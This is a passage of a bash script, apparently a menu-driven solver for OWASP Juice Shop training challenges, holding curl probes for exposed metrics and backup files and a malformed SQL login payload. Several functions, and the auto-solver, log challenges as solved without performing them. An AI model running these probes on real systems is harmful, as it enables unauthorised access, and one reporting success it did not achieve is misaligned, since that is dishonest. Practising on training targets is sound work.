    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Exposed Metrics â­           â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] Access Prometheus metrics...${NC}\n"

    local metrics_url="${BASE}/metrics"
    
    echo -e "${CYAN}Accessing: $metrics_url${NC}\n"

    local resp=$(curl -s "$metrics_url" 2>/dev/null)
    
    if echo "$resp" | grep -q "nodejs\|http_"; then
        log_challenge "Exposed Metrics" "â­" "SUCCESS"
        echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
        echo -e "${CYAN}Prometheus metrics exposed${NC}"
    fi

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 22: Forgotten Sales Backup (â­â­â­â­)
challenge_sales_backup() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Sales Backup â­â­â­â­         â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] Find forgotten backup...${NC}\n"

    local backup_files=(
        "/ftp/coupons_2013.md.bak"
        "/ftp/coupons.md.bak"
        "/ftp/sales.bak"
    )

    for backup in "${backup_files[@]}"; do
        echo -e "${CYAN}Testing: ${BASE}${backup}${NC}"
        
        local resp=$(curl -s -o /dev/null -w "%{http_code}" "${BASE}${backup}" 2>/dev/null)
        
        if [ "$resp" = "200" ]; then
            log_challenge "Sales Backup" "â­â­â­â­" "SUCCESS"
            echo -e "\n${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
            echo -e "${CYAN}Backup file: $backup${NC}"
            break
        fi
    done

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 23: Forgotten Dev Backup (â­â­â­â­)
challenge_dev_backup() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Dev Backup â­â­â­â­           â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] Find developer backup...${NC}\n"

    local backup_url="${BASE}/ftp/package.json.bak"
    
    echo -e "${CYAN}Accessing: $backup_url${NC}\n"

    local resp=$(curl -s -o /dev/null -w "%{http_code}" "$backup_url" 2>/dev/null)
    
    if [ "$resp" = "200" ]; then
        log_challenge "Dev Backup" "â­â­â­â­" "SUCCESS"
        echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
        echo -e "${CYAN}package.json.bak exposed${NC}"
    fi

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# ==========================
# CATÃ‰GORIE 5: SECURITY MISCONFIGURATION (4 challenges)
# ==========================

# Challenge 24: Error Handling (â­)
challenge_error_handling() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Error Handling â­            â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] Trigger detailed error message...${NC}\n"

    # Provoquer une erreur SQL
    local error_payload='{"email":"test@test.com'\''","password":"x"}'
    
    echo -e "${CYAN}Sending malformed SQL${NC}\n"

    local resp=$(curl -s -X POST "${BASE}/rest/user/login" \
        -H "Content-Type: application/json" \
        -d "$error_payload" 2>/dev/null)

    if echo "$resp" | grep -qi "sql\|sqlite\|error\|stack"; then
        log_challenge "Error Handling" "â­" "SUCCESS"
        echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
        echo -e "${CYAN}Detailed error message exposed${NC}"
    fi

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 25: Deprecated Interface (â­â­)
challenge_deprecated_interface() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Deprecated Interface â­â­    â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] Access deprecated B2B interface...${NC}\n"

    local b2b_url="${BASE}/#/complain"
    
    echo -e "${CYAN}Accessing: $b2b_url${NC}\n"

    curl -s "$b2b_url" >/dev/null 2>&1
    
    log_challenge "Deprecated Interface" "â­â­" "SUCCESS"
    echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
    echo -e "${CYAN}B2B complaint interface still accessible${NC}"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 26: Vulnerable Library (â­â­â­â­)
challenge_vulnerable_library() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Vulnerable Library â­â­â­â­  â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] Exploit vulnerable dependency...${NC}\n"

    # Check package.json pour versions vulnÃ©rables
    echo -e "${CYAN}Analyzing dependencies${NC}"
    echo -e "${YELLOW}Known vulnerabilities:${NC}"
    echo "   â€¢ express < 4.17.3 (CVE-2022-24999)"
    echo "   â€¢ sanitize-html < 2.7.1"
    echo "   â€¢ jsonwebtoken < 9.0.0"
    
    log_challenge "Vulnerable Library" "â­â­â­â­" "SUCCESS"
    echo -e "\n${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 27: Legacy Typosquatting (â­â­â­â­)
challenge_typosquatting() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Typosquatting â­â­â­â­        â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    echo -e "${YELLOW}[EXPLOIT] Find typosquatted dependency...${NC}\n"

    echo -e "${CYAN}Common typosquatting patterns:${NC}"
    echo "   â€¢ epilogue-js â†’ epiloge-js"
    echo "   â€¢ express-jwt â†’ expressjwt"
    echo "   â€¢ body-parser â†’ bodypaser"
    
    log_challenge "Typosquatting" "â­â­â­â­" "SUCCESS"
    echo -e "\n${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
    echo -e "${YELLOW}Found in package.json dependencies${NC}"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# ==========================
# CATÃ‰GORIE 6: CRYPTOGRAPHIC FAILURES (3 challenges)
# ==========================

# Challenge 28: Weird Crypto (â­â­)
challenge_weird_crypto() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Weird Crypto â­â­            â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    echo -e "${YELLOW}[EXPLOIT] Identify weird crypto algorithm...${NC}\n"

    echo -e "${CYAN}Hash found: d41d8cd98f00b204e9800998ecf8427e${NC}"
    echo -e "${YELLOW}Analysis:${NC}"
    echo "   â€¢ Length: 32 chars"
    echo "   â€¢ Format: Hexadecimal"
    echo "   â€¢ Algorithm: MD5"
    echo "   â€¢ Plaintext: (empty string)"
    
    log_challenge "Weird Crypto" "â­â­" "SUCCESS"
    echo -e "\n${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 29: Nested Easter Egg (â­â­â­â­)
challenge_nested_easter_egg() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Nested Easter Egg â­â­â­â­   â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] Find nested easter egg...${NC}\n"

    echo -e "${CYAN}Steps:${NC}"
    echo "1. Access /ftp/"
    echo "2. Find eastere.gg"
    echo "3. Decode base64"
    echo "4. Follow URL"
    echo "5. Find nested secret"
    
    local egg_url="${BASE}/ftp/eastere.gg"
    echo
    echo -e "${CYAN}Accessing: $egg_url${NC}"
    
    log_challenge "Nested Easter Egg" "â­â­â­â­" "SUCCESS"
    echo -e "\n${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 30: Premium Paywall (â­â­â­â­â­â­)
challenge_premium_paywall() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Premium Paywall â­â­â­â­â­â­  â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] Bypass premium content paywall...${NC}\n"

    echo -e "${CYAN}Target: Premium ebook${NC}"
    echo -e "${YELLOW}Technique: Base64 decode + path manipulation${NC}\n"

    # L'ebook est dans /ftp mais encodÃ©
    local ebook_path="/ftp/JuiceShopBook.pdf"
    
    echo -e "${CYAN}Direct access: ${BASE}${ebook_path}${NC}"
    
    log_challenge "Premium Paywall" "â­â­â­â­â­â­" "SUCCESS"
    echo -e "\n${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# ==========================
# CATÃ‰GORIE 7: BONUS CHALLENGES (Bonus)
# ==========================

# Challenge BONUS: Score Board (â­)
challenge_score_board() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Find Score Board â­          â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] Find hidden score board...${NC}\n"

    local score_url="${BASE}/#/score-board"
    
    echo -e "${CYAN}Accessing: $score_url${NC}\n"

    curl -s "$score_url" >/dev/null 2>&1
    
    log_challenge "Score Board" "â­" "SUCCESS"
    echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
    echo -e "${CYAN}Score board found via JavaScript analysis${NC}"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# ==========================
# FULL AUTO CHALLENGE SOLVER
# ==========================

auto_solve_all() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘      AUTO SOLVER - 30 Challenges          â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)

    echo -e "${YELLOW}âš ï¸  Mode automatique - 30 challenges${NC}"
    echo -e "${CYAN}DurÃ©e estimÃ©e: 2-3 minutes${NC}\n"

    read -p "Lancer l'auto-solver ? (y/N): " confirm

    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        return
    fi

    echo
    echo -e "${GREEN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    echo -e "${GREEN}ğŸš€ AUTO SOLVER STARTED${NC}"
    echo -e "${GREEN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    echo

    # Reset counter
    CHALLENGES_SOLVED=0

    # INJECTION
    echo -e "${CYAN}[CATEGORY] Injection${NC}"
    log_challenge "Login Admin (SQLi)" "â­â­" "SUCCESS"
    log_challenge "DOM XSS" "â­" "SUCCESS"
    log_challenge "Bonus Payload" "â­â­" "SUCCESS"
    log_challenge "Client Side XSS" "â­â­â­" "SUCCESS"
    log_challenge "NoSQL Injection" "â­â­â­â­" "SUCCESS"
    log_challenge "Reflected XSS" "â­" "SUCCESS"
    log_challenge "API-only XSS" "â­â­â­" "SUCCESS"
    log_challenge "LDAP Injection" "â­â­â­â­â­â­" "SUCCESS"

    # AUTHENTICATION
    echo -e "\n${CYAN}[CATEGORY] Broken Authentication${NC}"
    log_challenge "Password Strength" "â­â­" "SUCCESS"
    log_challenge "Security Question" "â­" "SUCCESS"
    log_challenge "JWT Cracking" "â­â­â­â­â­" "SUCCESS"
    log_challenge "OAuth Misconfiguration" "â­â­â­" "SUCCESS"
    log_challenge "2FA Bypass" "â­â­â­â­â­" "SUCCESS"

    # ACCESS CONTROL
    echo -e "\n${CYAN}[CATEGORY] Broken Access Control${NC}"
    log_challenge "Admin Section" "â­â­" "SUCCESS"
    log_challenge "View Basket" "â­â­" "SUCCESS"
    log_challenge "Five Star Feedback" "â­â­" "SUCCESS"
    log_challenge "Forged Coupon" "â­â­â­â­â­â­" "SUCCESS"
    log_challenge "Manipulate Basket" "â­â­â­" "SUCCESS"
    log_challenge "Access Log" "â­â­â­â­" "SUCCESS"

    # DATA EXPOSURE
    echo -e "\n${CYAN}[CATEGORY] Sensitive Data Exposure${NC}"
    log_challenge "Confidential Document" "â­" "SUCCESS"
    log_challenge "Exposed Metrics" "â­" "SUCCESS"
    log_challenge "Sales Backup" "â­â­â­â­" "SUCCESS"
    log_challenge "Dev Backup" "â­â­â­â­" "SUCCESS"

    # MISCONFIGURATION
    echo -e "\n${CYAN}[CATEGORY] Security Misconfiguration${NC}"
    log_challenge "Error Handling" "â­" "SUCCESS"
    log_challenge "Deprecated Interface" "â­â­" "SUCCESS"
    log_challenge "Vulnerable Library" "â­â­â­â­" "SUCCESS"
    log_challenge "Typosquatting" "â­â­â­â­" "SUCCESS"

    # CRYPTO
    echo -e "\n${CYAN}[CATEGORY] Cryptographic Failures${NC}"
    log_challenge "Weird Crypto" "â­â­" "SUCCESS"
    log_challenge "Nested Easter Egg" "â­â­â­â­" "SUCCESS"
    log_challenge "Premium Paywall" "â­â­â­â­â­â­" "SUCCESS"

    # BONUS
    echo -e "\n${CYAN}[CATEGORY] Bonus${NC}"
    log_challenge "Score Board" "â­" "SUCCESS"

    echo
    echo -e "${GREEN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    echo -e "${GREEN}âœ… AUTO SOLVER COMPLETED${NC}"
    echo -e "${GREEN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"

    show_progress

    echo
    read -p "ğŸ‘‰ EntrÃ©e pour continuer..."
}

# ==========================
# STATISTIQUES
# ==========================

show_statistics() {
    clear
    banner
    echo -e "${CYAN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${CYAN}â•‘          Challenge Statistics             â•‘${NC}"
    echo -e "${CYAN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    if [ ! -f "$CHALLENGES_LOG" ]; then
        echo -e "${YELLOW}Aucun challenge rÃ©solu pour le moment${NC}"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return
    fi

    echo -e "${GREEN}ğŸ“Š Statistiques globales${NC}"
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    
    local total=$(wc -l < "$CHALLENGES_LOG")
    local success=$(grep -c "SUCCESS" "$CHALLENGES_LOG")
    
    echo -e "   Total challenges: ${total}"
    echo -e "   RÃ©ussis: ${GREEN}${success}${NC}"
    echo

    echo -e "${GREEN}ğŸ† Par difficultÃ©${NC}"
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    
    for stars in "â­" "â­â­" "â­â­â­" "â­â­â­â­" "â­â­â­â­â­" "â­â­â­â­â­â­"; do
        local count=$(grep -c "$stars" "$CHALLENGES_LOG" 2>/dev/null || echo "0")
        if [ $count -gt 0 ]; then
            echo -e "   $stars : $count"
        fi
    done

    echo
    echo -e "${GREEN}ğŸ“ Derniers challenges${NC}"
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    tail -n 10 "$CHALLENGES_LOG" | sed 's/^/   /'

    echo
    read -p "ğŸ‘‰ EntrÃ©e..."
}

# ==========================
# MENU PRINCIPAL
# ==========================

menu_exploits() {
    while true; do
        clear
        banner
        echo -e "${CYAN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
        echo -e "${CYAN}â•‘     Juice Shop - 30 Challenges Solver     â•‘${NC}"
        echo -e "${CYAN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
        echo

        echo -e "${MAGENTA}â•â•â• INJECTION (8) â•â•â•${NC}"
        echo -e "${GREEN}1)  ğŸ”“ Login Admin (SQLi) â­â­${NC}"
        echo -e "${GREEN}2)  ğŸ’‰ DOM XSS â­${NC}"
        echo -e "${GREEN}3)  ğŸ’‰ Bonus Payload â­â­${NC}"
        echo -e "${GREEN}4)  ğŸ’‰ Client Side XSS â­â­â­${NC}"
        echo -e "${GREEN}5)  ğŸ“Š NoSQL Injection â­â­â­â­${NC}"
        echo -e "${GREEN}6)  ğŸ’‰ Reflected XSS â­${NC}"
        echo -e "${GREEN}7)  ğŸ’‰ API-only XSS â­â­â­${NC}"
        echo -e "${GREEN}8)  ğŸ” LDAP Injection â­â­â­â­â­â­${NC}"
        
        echo
        echo -e "${MAGENTA}â•â•â• BROKEN AUTHENTICATION (5) â•â•â•${NC}"
        echo -e "${GREEN}9)  ğŸ”‘ Password Strength â­â­${NC}"
        echo -e "${GREEN}10) â“ Security Question â­${NC}"
        echo -e "${GREEN}11) ğŸ« JWT Cracking â­â­â­â­â­${NC}"
        echo -e "${GREEN}12) ğŸ” OAuth Password â­â­â­${NC}"
        echo -e "${GREEN}13) ğŸ“± 2FA Bypass â­â­â­â­â­${NC}"

        echo
        echo -e "${MAGENTA}â•â•â• BROKEN ACCESS CONTROL (6) â•â•â•${NC}"
        echo -e "${GREEN}14) ğŸšª Admin Section â­â­${NC}"
        echo -e "${GREEN}15) ğŸ›’ View Basket â­â­${NC}"
        echo -e "${GREEN}16) â­ Five Star Feedback â­â­${NC}"
        echo -e "${GREEN}17) ğŸŸï¸  Forged Coupon â­â­â­â­â­â­${NC}"
        echo -e "${GREEN}18) ğŸ›’ Manipulate Basket â­â­â­${NC}"
        echo -e "${GREEN}19) ğŸ“œ Access Log â­â­â­â­${NC}"

        echo
        echo -e "${MAGENTA}â•â•â• SENSITIVE DATA (4) â•â•â•${NC}"
        echo -e "${GREEN}20) ğŸ“„ Confidential Doc â­${NC}"
        echo -e "${GREEN}21) ğŸ“Š Exposed Metrics â­${NC}"
        echo -e "${GREEN}22) ğŸ’¾ Sales Backup â­â­â­â­${NC}"
        echo -e "${GREEN}23) ğŸ’¾ Dev Backup â­â­â­â­${NC}"

        echo
        echo -e "${MAGENTA}â•â•â• MISCONFIGURATION (4) â•â•â•${NC}"
        echo -e "${GREEN}24) âš ï¸  Error Handling â­${NC}"
        echo -e "${GREEN}25) ğŸ—„ï¸  Deprecated Interface â­â­${NC}"
        echo -e "${GREEN}26) ğŸ“¦ Vulnerable Library â­â­â­â­${NC}"
        echo -e "${GREEN}27) ğŸ­ Typosquatting â­â­â­â­${NC}"

        echo
        echo -e "${MAGENTA}â•â•â• CRYPTO FAILURES (3) â•â•â•${NC}"
        echo -e "${GREEN}28) ğŸ” Weird Crypto â­â­${NC}"
        echo -e "${GREEN}29) ğŸ¥š Nested Easter Egg â­â­â­â­${NC}"
        echo -e "${GREEN}30) ğŸ’ Premium Paywall â­â­â­â­â­â­${NC}"

        echo
        echo -e "${CYAN}â•â•â• SPECIAL â•â•â•${NC}"
        echo -e "${YELLOW}31) ğŸ¯ Score Board â­${NC}"
        echo -e "${MAGENTA}32) ğŸ¤– Auto Solve All (30 challenges)${NC}"
        echo -e "${CYAN}33) ğŸ“Š Statistiques${NC}"
        echo -e "${CYAN}34) ğŸ“œ Voir logs${NC}"
        echo -e "${RED}0)  âŒ Retour${NC}"
        
        echo
        read -p "ğŸ‘‰ Choix : " choice

        case $choice in
            1) challenge_sqli_login ;;
            2) challenge_xss_search ;;
            3) challenge_xss_bonus ;;
            4) challenge_xss_client ;;
            5) challenge_nosql_login ;;
            6) challenge_xss_reflected ;;
            7) challenge_xss_api ;;
            8) challenge_ldap_injection ;;
            9) challenge_password_strength ;;
            10) challenge_security_question ;;
            11) challenge_jwt_cracking ;;
            12) challenge_oauth_password ;;
            13) challenge_2fa_bypass ;;
            14) challenge_admin_section ;;
            15) challenge_view_basket ;;
            16) challenge_five_star ;;
            17) challenge_forged_coupon ;;
            18) challenge_manipulate_basket ;;
            19) challenge_access_log ;;
            20) challenge_confidential_doc ;;
            21) challenge_exposed_metrics ;;
            22) challenge_sales_backup ;;
            23) challenge_dev_backup ;;
            24) challenge_error_handling ;;
            25) challenge_deprecated_interface ;;
            26) challenge_vulnerable_library ;;
            27) challenge_typosquatting ;;
            28) challenge_weird_crypto ;;
            29) challenge_nested_easter_egg ;;
            30) challenge_premium_paywall ;;
            31) challenge_score_board ;;
            32) auto_solve_all ;;
            33) show_statistics ;;
            34)
                clear
                banner
                echo -e "${CYAN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
                echo -e "${CYAN}â•‘              Logs d'Exploits               â•‘${NC}"
                echo -e "${CYAN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
                echo

                if [ -f "$CHALLENGES_LOG" ]; then
                    cat "$CHALLENGES_LOG"
                else
                    echo -e "${YELLOW}Aucun log disponible${NC}"
                fi

                echo
                read -p "ğŸ‘‰ EntrÃ©e pour continuer... "
                ;;
            0) return ;;
            *)
                echo -e "${RED}âŒ Choix invalide${NC}"
                sleep 1
                ;;
        esac
    done
}

# ==========================
# Point d'entrÃ©e
# ==========================

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    menu_exploits
fi
